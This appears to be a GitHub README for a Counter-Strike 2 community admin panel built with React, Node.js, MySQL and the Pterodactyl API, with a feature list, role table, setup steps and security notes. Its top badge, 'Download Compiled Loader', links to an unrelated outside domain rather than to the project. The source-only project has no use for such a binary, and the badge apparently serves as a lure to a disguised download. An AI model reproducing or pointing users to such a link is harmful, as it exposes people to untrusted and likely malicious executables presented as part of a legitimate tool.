# CS2 Administrative Panel 🎮

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A high-performance, unified management dashboard for **Counter-Strike 2** communities. This panel serves as a secure bridge between your **MySQL Game Database** (CounterStrikeSharp/Source2Admin) and the **Pterodactyl Client API**.
<img width="1916" height="609" alt="image" src="https://github.com/user-attachments/assets/a8458f3c-6f58-48e0-b938-83a1475cfeda" />

---

## 🚀 Key Features

### 🛠️ Server Management (Obfuscated Wrapper)
- **Unified Control:** Manage multiple servers across different regions (EMEA, APAC, NA) in one view.
- **Power Actions:** Role-restricted Start, Stop, Restart, and Kill commands.
- **Direct Connect:** One-click "Join" button using the `steam://` protocol.
- **Internal Security:** Pterodactyl IDs and API keys are strictly backend-only.

### 🛡️ Hierarchical RBAC (Role-Based Access Control)

| Role | Permissions |
| :--- | :--- |
| **Administrator** | Full control, User management, VIP/Admin editing, all Power Actions. |
| **Senior Moderator** | Manage Bans, **Restart** servers (Start/Stop restricted). |
| **Moderator** | Manage Player Bans and view basic server statistics. |

### 📜 Professional Audit Logging
Every write operation (POST, PUT, DELETE) is tracked with **State-Change Detailing**:
- **Granular Logs:** Records exactly what changed (e.g., *Email changed from A to B*).
- **Categorization:** Logs are tagged by `Log Type` (Moderator, Senior Moderator, Administrator).
- **Accountability:** Tracks the specific staff member responsible for every action.

### 📊 Consolidated Analytics
- A single-call API aggregates stats for Total Servers, Active Bans, Active Admins, and VIP counts.

---

## 🏗️ Tech Stack

- **Frontend:** React 18 (Vite), Tailwind CSS, Lucide Icons, Shadcn/UI.
- **Backend:** Node.js, Express, JWT (JSON Web Tokens).
- **Database:** MySQL 8.0 (Game Data) + Pterodactyl Client API integration.
- **Communication:** Axios (Backend) & Custom Authenticated Fetch Interceptor (Frontend).

---

## ⚙️ Installation & Setup

### 1. Backend Configuration
Edit apps/api/.env
```env
PORT=5000
JWT_SECRET=your_super_secret_key
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=your_password
DB_NAME=cs2_management

# Pterodactyl Integration
PTERO_BASE_URL=https://panel.example.com
PTERO_API_KEY=ptlc_YOUR_CLIENT_API_KEY
```

### 2. Install Dependencies
```env
# Frontend (Web Server)
cd apps/web/
npm install
npm run dev

# Backend (API Server)
cd apps/api/
npm install
npm run dev
```

### 3. Running the project (locally)
```bash
# Frontend (Web Server)
cd apps/web/
npm run dev

# Backend (API Server)
cd apps/api/
npm run dev
```
---
## 🔒 Security Implementation
### Frontend Interceptor
The application uses a global Fetch Interceptor to monitor for 401 Unauthorized responses. If a session expires or a token becomes invalid, the system automatically:
#### 1. Clears localStorage (Token and User data).
#### 2. Resets the Global State.
#### 3. Redirects the user to the /login page with an error toast.

### Backend Protection
- **BCRYPT:** All passwords are salted and hashed.
- **Role Guards:** Middlewares ensure that even if a user knows an endpoint, they cannot execute unauthorized actions (e.g., Senior Moderators attempting a 'Stop' signal).
---


